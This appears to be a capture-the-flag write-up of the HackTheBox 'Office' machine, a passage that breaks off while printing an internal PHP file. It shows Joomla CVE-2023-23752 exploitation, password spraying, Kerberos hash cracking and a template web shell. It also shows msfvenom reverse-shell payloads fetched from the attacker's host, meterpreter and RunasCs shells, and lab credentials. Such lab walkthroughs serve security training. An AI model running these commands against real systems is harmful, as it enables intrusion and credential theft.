@@ -1,0 +1,1413 @@
+<title>HackTheBox - Office (Hard)</title>
+<header>
+  <div class="header">
+    <div class="titleContainer">
+      <img class="headerIcon" src="/write-ups/HackTheBox/Hard/Office/icon.png"/>
+      <p class="mainTitle">HackTheBox - Office (Hard)</p>
+    </div>
+  </div>
+</header>
+<div class="writeUp">
+  <h1 id="table-of-contents">Table of contents</h1>
+  <nav id="tableOfContents" class="tableOfContents">
+  </nav>
+  <h1 id="enumeration">Enumeration</h1>
+  <h2 id="nmap-scan">Nmap scan</h2>
+  <div class="codeBlock"># Nmap 7.93 scan initiated Sat Feb 17 20:03:28 2024 as: nmap -A -p- -T5 -v -oN nmapResults.txt 10.129.61.196
+Nmap scan report for 10.129.61.196
+Host is up (0.030s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
+|_http-title: Home
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-generator: Joomla! - Open Source Content Management
+| http-robots.txt: 16 disallowed entries (15 shown)
+| /joomla/administrator/ /administrator/ /api/ /bin/ 
+| /cache/ /cli/ /components/ /includes/ /installation/ 
+|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-18 03:04:42Z)
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Issuer: commonName=office-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-05-10T12:36:58
+| Not valid after:  2024-05-09T12:36:58
+| MD5:   b83fab78db28734dde8411e9420f8878
+|_SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
+|_ssl-date: TLS randomness does not represent time
+443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:   a0a44cc99e84b26f9e639f9ed229dee0
+|_SHA-1: b0238c547a905bfa119c4e8baccaeacf36491ff6
+| http-methods: 
+|_  Supported Methods: POST
+| tls-alpn: 
+|_  http/1.1
+|_http-title: 403 Forbidden
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Issuer: commonName=office-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-05-10T12:36:58
+| Not valid after:  2024-05-09T12:36:58
+| MD5:   b83fab78db28734dde8411e9420f8878
+|_SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
+|_ssl-date: TLS randomness does not represent time
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Issuer: commonName=office-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-05-10T12:36:58
+| Not valid after:  2024-05-09T12:36:58
+| MD5:   b83fab78db28734dde8411e9420f8878
+|_SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Issuer: commonName=office-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-05-10T12:36:58
+| Not valid after:  2024-05-09T12:36:58
+| MD5:   b83fab78db28734dde8411e9420f8878
+|_SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49681/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+63610/tcp open  msrpc         Microsoft Windows RPC
+63623/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h59m58s
+| smb2-time: 
+|   date: 2024-02-18T03:05:34
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Feb 17 20:06:13 2024 -- 1 IP address (1 host up) scanned in 165.43 seconds</div>
+<p>We found the office.htb domain name, which we can add to our /etc/hosts file (or C:/Windows/System32/drivers/etc/hosts if you are on a Windows host). </p>
+<h2 id="web-enumeration">Web enumeration</h2>
+<p>Let’s see what we can find on the web server on port 80 :</p>
+<img src="/write-ups/HackTheBox/Hard/Office/Untitled.png" alt="Untitled">
+<p>As we can see, Joomla is running on port 80. Joomla is a free and open-source content management system (CMS) for <strong>publishing web content</strong>. Over the years 
+  Joomla has won several awards. It is built on a model–view–controller web application framework that can be used independently of the CMS that allows you to build powerful 
+  online applications. There is a recent vulnerability affecting Joomla that allows an attacker to retrieve sensitive data from the API.</p>
+<p>First, let’s check the Joomla version running on the target system :</p>
+<div class="codeBlock">msf6 &gt; use auxiliary/scanner/http/joomla_version
+msf6 auxiliary(scanner/http/joomla_version) &gt; set RHOSTS 10.129.21.11
+RHOSTS =&gt; 10.129.21.11
+msf6 auxiliary(scanner/http/joomla_version) &gt; run
+
+[*] Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+[+] Joomla version: 4.2.7
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</div>
+<h1 id="initial-access">Initial access</h1>
+<h2 id="joomla-information-disclosure">Joomla information disclosure</h2>
+<p>The web server is running Joomla 4.2.7 which is vulnerable to CVE-2023-23752. There is a Metasploit Framework module available to exploit this vulnerability :</p>
+<div class="codeBlock">msf6 &gt; search joomla cve:2023-23752
+
+Matching Modules
+================
+
+    #  Name                                                      Disclosure Date  Rank    Check  Description
+    -  ----                                                      ---------------  ----    -----  -----------
+    0  auxiliary/scanner/http/joomla_api_improper_access_checks  2023-02-01       normal  Yes    Joomla API Improper Access Checks
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/joomla_api_improper_access_checks
+
+msf6 &gt; use 0
+msf6 auxiliary(scanner/http/joomla_api_improper_access_checks) &gt; run
+
+[+] Users JSON saved to /home/cyberretta/.msf4/loot/20240217202333_default_10.129.61.196_joomla.users_955595.bin
+[+] Joomla Users
+============
+
+  ID   Super User  Name        Username       Email                         Send Email  Register Date        Last Visit Date      Group Names
+  --   ----------  ----        --------       -----                         ----------  -------------        ---------------      -----------
+  474  *           Tony Stark  Administrator  Administrator@holography.htb  1           2023-04-13 23:27:32  2024-01-24 13:00:47  Super Users
+
+[+] Config JSON saved to /home/cyberretta/.msf4/loot/20240217202333_default_10.129.61.196_joomla.config_907287.bin
+[+] Joomla Config
+=============
+
+  Setting        Value
+  -------        -----
+  db encryption  0
+  db host        localhost
+  db name        joomla_db
+  db password    H0lOgrams4reTakIng0Ver754!
+  db prefix      if2tx_
+  db user        root
+  dbtype         mysqli
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</div>
+<h2 id="password-spraying">Password spraying</h2>
+<p>
+  We retrieved the credentials for the MySQL database, but according to Nmap, we do not have access to the MySQL service externally. So, we could try to use this password 
+  to perform password spraying against domain users. First, we need to enumerate domain users. We can do this using Kerbrute :
+</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~/…/HTB/Machines/Hard/Office]
+└─$ kerbrute userenum -d office.htb --dc office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 02/17/24 - Ronnie Flathers @ropnop
+
+2024/02/17 20:28:32 &gt;  Using KDC(s):
+2024/02/17 20:28:32 &gt;   office.htb:88
+
+2024/02/17 20:28:38 &gt;  [+] VALID USERNAME:       administrator@office.htb
+2024/02/17 20:29:55 &gt;  [+] VALID USERNAME:       ewhite@office.htb
+2024/02/17 20:29:55 &gt;  [+] VALID USERNAME:       etower@office.htb
+2024/02/17 20:29:55 &gt;  [+] VALID USERNAME:       dwolfe@office.htb
+2024/02/17 20:29:55 &gt;  [+] VALID USERNAME:       dmichael@office.htb
+2024/02/17 20:29:55 &gt;  [+] VALID USERNAME:       dlanor@office.htb
+</div>
+<p>Now, we can perform a password spraying attack on the SMB service :</p>
+<div class="codeBlock">msf6 &gt; use auxiliary/scanner/smb/smb_login
+msf6 auxiliary(scanner/smb/smb_login) &gt; set SMBDomain office.htb
+SMBDomain =&gt; office.htb
+msf6 auxiliary(scanner/smb/smb_login) &gt; set RHOSTS office.htb
+RHOSTS =&gt; office.htb
+msf6 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE /home/cyberretta/Documents/HTB/Machines/Hard/Office/loot/users.txt
+USER_FILE =&gt; /home/cyberretta/Documents/HTB/Machines/Hard/Office/loot/users.txt
+msf6 auxiliary(scanner/smb/smb_login) &gt; set PASSWORD H0lOgrams4reTakIng0Ver754!
+PASSWORD =&gt; H0lOgrams4reTakIng0Ver754!
+msf6 auxiliary(scanner/smb/smb_login) &gt; set BLANK_PASSWORDS false
+BLANK_PASSWORDS =&gt; false
+msf6 auxiliary(scanner/smb/smb_login) &gt; run
+
+[*] 10.129.21.11:445      - 10.129.21.11:445 - Starting SMB login bruteforce
+[-] 10.129.21.11:445      - 10.129.21.11:445 - Failed: &#39;office.htb\administrator:H0lOgrams4reTakIng0Ver754!&#39;,
+[!] 10.129.21.11:445      - No active DB -- Credential data will not be saved!
+[-] 10.129.21.11:445      - 10.129.21.11:445 - Failed: &#39;office.htb\ewhite:H0lOgrams4reTakIng0Ver754!&#39;,
+[-] 10.129.21.11:445      - 10.129.21.11:445 - Failed: &#39;office.htb\etower:H0lOgrams4reTakIng0Ver754!&#39;,
+[+] 10.129.21.11:445      - 10.129.21.11:445 - Success: &#39;office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!&#39;
+[-] 10.129.21.11:445      - 10.129.21.11:445 - Failed: &#39;office.htb\dmichael:H0lOgrams4reTakIng0Ver754!&#39;,
+[-] 10.129.21.11:445      - 10.129.21.11:445 - Failed: &#39;office.htb\dlanor:H0lOgrams4reTakIng0Ver754!&#39;,
+[*] office.htb:445        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</div>
+<p>The password was reused for dwolfe user account.</p>
+<h2 id="asreqroast">ASREQroast</h2>
+<p>Let’s see what shares we can find on the SMB service using the credentials we found :</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~/…/Machines/Hard/Office/loot]
+└─$ smbclient -L //office.htb -U dwolfe
+Password for [WORKGROUP\dwolfe]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SOC Analysis    Disk      
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to office.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</div>
+<p>The only share that seems unusual is the SOC Analysis share. Let’s see what files we can find on this share :</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~/…/Machines/Hard/Office/loot]
+└─$ smbclient &quot;//office.htb/SOC Analysis&quot; -U dwolfe 
+Password for [WORKGROUP\dwolfe]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed May 10 20:52:24 2023
+  ..                                DHS        0  Wed Feb 14 11:18:31 2024
+  Latest-System-Dump-8fbc124d.pcap      A  1372860  Mon May  8 02:59:00 2023
+
+                6265599 blocks of size 4096. 1051503 blocks available
+</div>
+<p>
+  There is a pcap file which seems to be a network capture of the target system itself. Let’s download it and see if we can find useful information inside of it. 
+  After some research, we can find packets corresponding to a Kerberos authentication sent by the tstark user :
+</p>
+<img src="/write-ups/HackTheBox/Hard/Office/Capture_dcran_2024-02-19_12-23-41.png" alt="Capture d’écran_2024-02-19_12-23-41.png">
+<p>
+  In the cipher field, there is a hash which is generated with the password of the user that sent the request to the Kerberos service. 
+  We can use it to crack the password of tstark user account. First, we need to write the hash in a format that hashcat can understand :
+</p>
+<div class="codeBlock">$krb5pa$[etype]$[user]$[domain]$[hash]
+</div>
+<p>Which gives us this hash :</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~/…/Machines/Hard/Office/loot]
+└─$ cat hash.txt 
+$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
+</div>
+<p>Now, let’s try to crack it using hashcat :</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~/…/Machines/Hard/Office/loot]
+└─$ hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt --quiet -w 3 -O
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol
+
+NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+Do NOT report auto-detect issues unless you are certain of the hash type.
+
+$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
+</div>
+<h2 id="remote-code-execution">Remote Code Execution</h2>
+<p>
+  We successfully cracked the hash and found the password for the tstark user account. We found earlier that Tony Stark is the administrator of the Joomla installation. 
+  We can try to login to the Joomla admin panel using the password we just found and the Administrator user :
+</p>
+<img src="/write-ups/HackTheBox/Hard/Office/Untitled 1.png" alt="Untitled">
+<p>After clicking on Log in, we are redirected to this page :</p>
+<img src="/write-ups/HackTheBox/Hard/Office/Capture_dcran_2024-02-19_00-25-22.png" alt="Capture d’écran_2024-02-19_00-25-22.png">
+<p>
+  We are now logged in to the Joomla admin panel ! We may be able to get a shell by editing the php code of a template’s page. For exemple, we could edit error.php 
+  in the template to add web shell :
+</p>
+<img src="/write-ups/HackTheBox/Hard/Office/Capture_dcran_2024-02-19_00-28-47.png" alt="Capture d’écran_2024-02-19_00-28-47.png">
+<p>After saving the modifications, we can use curl to execute arbitrary OS commands on the target system :</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~/…/Machines/Hard/Office/loot]
+└─$ curl http://office.htb/templates/cassiopeia/error.php?cmd=whoami
+office\web_account
+</div>
+<p>As we can see, we can execute OS commands as web_account. Let’s generate a meterpreter payload :</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~/…/Machines/Hard/Office/exploits]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o m.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: m.exe
+</div>
+<p>Now, we can open a web server and download the executable on the target system :</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~]
+└─$ curl &#39;http://office.htb/templates/cassiopeia/error.php?cmd=curl%2010.10.14.86/m.exe%20-o%20C:/Windows/Temp/m.exe&#39;
+</div>
+<p>On our web server, we can see that our executable was successfully downloaded :</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~/…/Machines/Hard/Office/exploits]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.21.11 - - [19/Feb/2024 00:33:30] &quot;GET /m.exe HTTP/1.1&quot; 200 -
+</div>
+<p>Then, we can start a listener :</p>
+<div class="codeBlock">msf6 &gt; use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST tun0
+LHOST =&gt; tun0
+msf6 exploit(multi/handler) &gt; set LPORT 4444
+LPORT =&gt; 4444
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.86:4444
+</div>
+<p>After this, we can execute the malicious executable on the target system :</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~]
+└─$ curl &#39;http://office.htb/templates/cassiopeia/error.php?cmd=C:/Windows/Temp/m.exe&#39;
+</div>
+<p>Finally, we can take a look at our listener to see if we received a connection :</p>
+<div class="codeBlock">[*] Started reverse TCP handler on 10.10.14.86:4444 
+[*] Sending stage (200774 bytes) to 10.129.21.11
+[*] Meterpreter session 1 opened (10.10.14.86:4444 -&gt; 10.129.21.11:65151) at 2024-02-19 00:36:29 +0100
+
+meterpreter &gt; getuid
+Server username: OFFICE\web_account
+</div>
+<p>We have now a foothold on the target system as web_account.</p>
+<h1 id="post-exploitation">Post-exploitation</h1>
+<h2 id="privilege-escalation-tstark">Privilege escalation (tstark)</h2>
+<p>
+  Since we already have the credentials for the tstark user account, we can already escalate our privileges to this user using RunasCs.exe. First, let’s upload 
+  RunasCs.exe to the target system :
+</p>
+<div class="codeBlock">meterpreter &gt; cd C:/Windows/Temp
+meterpreter &gt; upload /home/cyberretta/Téléchargements/RunasCs.exe
+[*] Uploading  : /home/cyberretta/Téléchargements/RunasCs.exe -&gt; RunasCs.exe
+[*] Uploaded 50.50 KiB of 50.50 KiB (100.0%): /home/cyberretta/Téléchargements/RunasCs.exe -&gt; RunasCs.exe
+[*] Completed  : /home/cyberretta/Téléchargements/RunasCs.exe -&gt; RunasCs.exe
+</div>
+<p>Now, we can get a reverse shell as tstark :</p>
+<div class="codeBlock">meterpreter &gt; shell
+Process 1264 created.
+Channel 12 created.
+Microsoft Windows [Version 10.0.20348.2322]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\Temp&gt;curl 10.10.14.86/RunasCs.exe -o RunasCs.exe
+curl 10.10.14.86/RunasCs.exe -o RunasCs.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                  Dload  Upload   Total   Spent    Left  Speed
+100 51712  100 51712    0     0   356k      0 --:--:-- --:--:-- --:--:--  358k
+
+C:\Windows\Temp&gt;.\RunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.86:4445
+.\RunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.86:4445
+[*] Warning: The logon for user &#39;tstark&#39; is limited. Use the flag combination --bypass-uac and --logon-type &#39;8&#39; to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-67409$\Default
+[+] Async process &#39;C:\Windows\system32\cmd.exe&#39; with pid 6020 created in background.
+</div>
+<p>Let’s see if we received a connection on our listener :</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~]
+└─$ pwncat-cs -lp 4445 -m windows
+/home/cyberretta/.local/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
+  &#39;class&#39;: algorithms.Blowfish,
+[00:50:21] Welcome to pwncat 🐈!                                                                                                              __main__.py:164
+[00:50:25] received connection from 10.129.21.11:58700                                                                                             bind.py:84
+[00:50:25] windows: downloading windows-c2 plugin                                                                                              manager.py:957
+[00:50:26] 0.0.0.0:4445: dropping stage one in &#39;\\Windows\\Tasks\\yIMBlibU&#39;                                                                    manager.py:957
+[00:50:28] 0.0.0.0:4445: using install utils from .net v4.0.30319                                                                              manager.py:957
+
+[00:50:30] 10.129.21.11:58700: registered new host w/ db                                                                                       manager.py:957
+(local) pwncat$                                                                                                                                             
+(remote) tstark@DC:C:\Windows\system32$ whoami
+whoami
+office\tstark
+</div>
+<p>We now have a shell as tstark. We can also run the meterpreter payload we used earlier to get a meterpreter shell as tstark.</p>
+<h2 id="local-enumeration">Local enumeration</h2>
+<p>
+  Since the target is a domain controller, we can use SharpHound to gather as much information as possible to find a way to take over the domain controller. First, 
+  let’s upload SharpHound :
+</p>
+<div class="codeBlock">meterpreter &gt; upload /home/cyberretta/Documents/Tools/Post-exploitation/Windows/SharpHound-v1.1.1.zip
+[*] Uploading  : /home/cyberretta/Documents/Tools/Post-exploitation/Windows/SharpHound-v1.1.1.zip -&gt; SharpHound-v1.1.1.zip
+[*] Uploaded 2.04 MiB of 2.04 MiB (100.0%): /home/cyberretta/Documents/Tools/Post-exploitation/Windows/SharpHound-v1.1.1.zip -&gt; SharpHound-v1.1.1.zip
+[*] Completed  : /home/cyberretta/Documents/Tools/Post-exploitation/Windows/SharpHound-v1.1.1.zip -&gt; SharpHound-v1.1.1.zip
+</div>
+<p>Now, let’s run SharpHound :</p>
+<div class="codeBlock">meterpreter &gt; load powershell 
+Loading extension powershell...Success.
+meterpreter &gt; powershell_shell
+PS &gt; Expand-Archive SharpHound-v1.1.1.zip
+PS &gt; ls
+
+    Directory: C:\Users\tstark\Documents
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         2/19/2024  12:03 AM                SharpHound-v1.1.1
+-a----         2/18/2024  11:56 PM           7168 m.exe
+-a----         2/19/2024  12:02 AM        2139199 SharpHound-v1.1.1.zip
+
+PS &gt; cd SharpHound-v1.1.1
+PS &gt; ls
+
+    Directory: C:\Users\tstark\Documents\SharpHound-v1.1.1
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/23/2023   2:34 PM        1052160 SharpHound.exe
+-a----         5/23/2023   2:34 PM           1886 SharpHound.exe.config
+-a----         5/23/2023   2:34 PM         175616 SharpHound.pdb
+-a----         5/23/2023   2:34 PM        1315706 SharpHound.ps1
+-a----         11/5/2016   4:55 AM          34496 System.Console.dll
+-a----         11/5/2016   4:56 AM          37096 System.Diagnostics.Tracing.dll
+-a----         11/5/2016   4:56 AM         265048 System.Net.Http.dll
+
+PS &gt; .\SharpHound.exe
+2024-02-19T00:03:57.0877475-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+2024-02-19T00:03:57.2440304-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2024-02-19T00:03:57.2596691-08:00|INFORMATION|Initializing SharpHound at 12:03 AM on 2/19/2024
+2024-02-19T00:03:57.4472172-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for office.htb : DC.office.htb
+2024-02-19T00:03:57.6034411-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2024-02-19T00:03:57.8065643-08:00|INFORMATION|Beginning LDAP search for office.htb
+2024-02-19T00:03:57.8534651-08:00|INFORMATION|Producer has finished, closing LDAP channel
+2024-02-19T00:03:57.8690665-08:00|INFORMATION|LDAP channel closed, waiting for consumers
+2024-02-19T00:04:27.8379902-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
+2024-02-19T00:04:44.1817041-08:00|INFORMATION|Consumers finished, closing output channel
+2024-02-19T00:04:44.2598312-08:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2024-02-19T00:04:45.2911031-08:00|INFORMATION|Status: 106 objects finished (+106 2.255319)/s -- Using 44 MB RAM
+2024-02-19T00:04:45.2911031-08:00|INFORMATION|Enumeration finished in 00:00:47.4867330
+2024-02-19T00:04:45.5410895-08:00|INFORMATION|Saving cache with stats: 65 ID to type mappings.
+  65 name to SID mappings.
+  0 machine sid mappings.
+  2 sid to domain mappings.
+  0 global catalog mappings.
+2024-02-19T00:04:45.5723381-08:00|INFORMATION|SharpHound Enumeration Completed at 12:04 AM on 2/19/2024! Happy Graphing!
+</div>
+<p>Now that SharpHound gathered domain information, we can download the result on our attacking host and open it with Bloodhound :</p>
+<div class="codeBlock">meterpreter &gt; download 20240219000443_BloodHound.zip 
+[*] Downloading: 20240219000443_BloodHound.zip -&gt; /home/cyberretta/20240219000443_BloodHound.zip
+[*] Downloaded 11.84 KiB of 11.84 KiB (100.0%): 20240219000443_BloodHound.zip -&gt; /home/cyberretta/20240219000443_BloodHound.zip
+[*] Completed  : 20240219000443_BloodHound.zip -&gt; /home/cyberretta/20240219000443_BloodHound.zip
+</div>
+<img src="/write-ups/HackTheBox/Hard/Office/Untitled 2.png" alt="Untitled">
+<p>
+  Bloodhound does not seems to find a way to gain admin access to the DC from the tstark user. But there is an interesting group that could gives us admin access to the DC 
+  if we find a way to access a member of it. Let’s take a look closer :
+</p>
+<img src="/write-ups/HackTheBox/Hard/Office/Untitled 3.png" alt="Untitled">
+<p>The GPO Managers group has GenericWrite permission on the Default Domain Policy GPO. Let’s see what users are member of this group :</p>
+<img src="/write-ups/HackTheBox/Hard/Office/Untitled 4.png" alt="Untitled">
+<p>
+  It seems that the only member of this group is hhogan. We can keep this in mind for later. We need to find a way to escalate our privileges to the hhogan user. 
+  In C:/, there is a xampp directory. If we take a look in C:/xampp/htdocs, it seems that there is an internal web application :
+</p>
+<div class="codeBlock">meterpreter &gt; cd C:/xampp/htdocs
+meterpreter &gt; ls
+Listing: C:\xampp\htdocs
+========================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2023-05-09 16:53:18 +0200  administrator
+040777/rwxrwxrwx  4096  dir   2024-01-30 17:39:19 +0100  internal
+040777/rwxrwxrwx  4096  dir   2023-05-09 00:10:47 +0200  joomla
+</div>
+<p>Let’s see what’s in the internal directory :</p>
+<div class="codeBlock">meterpreter &gt; ls
+Listing: C:\xampp\htdocs\internal
+=================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  4096  dir   2024-02-19 16:48:59 +0100  applications
+040777/rwxrwxrwx  0     dir   2023-05-02 01:27:15 +0200  css
+040777/rwxrwxrwx  4096  dir   2023-05-02 01:27:15 +0200  img
+100666/rw-rw-rw-  5113  fil   2024-01-30 17:38:34 +0100  index.html
+100666/rw-rw-rw-  5282  fil   2024-01-30 17:40:24 +0100  resume.php
+</div>
+<p>We can take a look at the resume.php file :</p>
+<div class="codeBlock">meterpreter &gt; cat resume.php
+&lt;?php
+$notifi = &quot;&quot;;
+if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot; ){
+  $stdname=trim($_POST[&#39;fullname&#39;]);
+  $email=str_replace(&#39;.&#39;,&#39;-&#39;,$_POST[&#39;email&#39;]);
+  $experience=trim($_POST[&#39;experience&#39;]);
+  $salary=trim($_POST[&#39;salary&#39;]);
+  $department=trim($_POST[&#39;department&#39;]);
+  $rewritefn = strtolower(str_replace(&#39; &#39;,&#39;-&#39;,&quot;$stdname-$department-$salary $experience $email&quot;));
+  
+  $filename =$_FILES[&#39;assignment&#39;][&#39;name&#39;];
+  $filetype= $_FILES[&#39;assignment&#39;][&#39;type&#39;];
+  $filesize =$_FILES[&#39;assignment&#39;][&#39;size&#39;];
+  $fileerr = $_FILES[&#39;assignment&#39;][&#39;error&#39;];
+  $filetmp = $_FILES[&#39;assignment&#39;][&#39;tmp_name&#39;];
+  chmod($_FILES[&#39;assignment&#39;][&#39;tmp_name&#39;], 0664);
+  // onigiri in .
+  $ext = explode(&#39;.&#39;,$filename);
+  //last piece of data from array
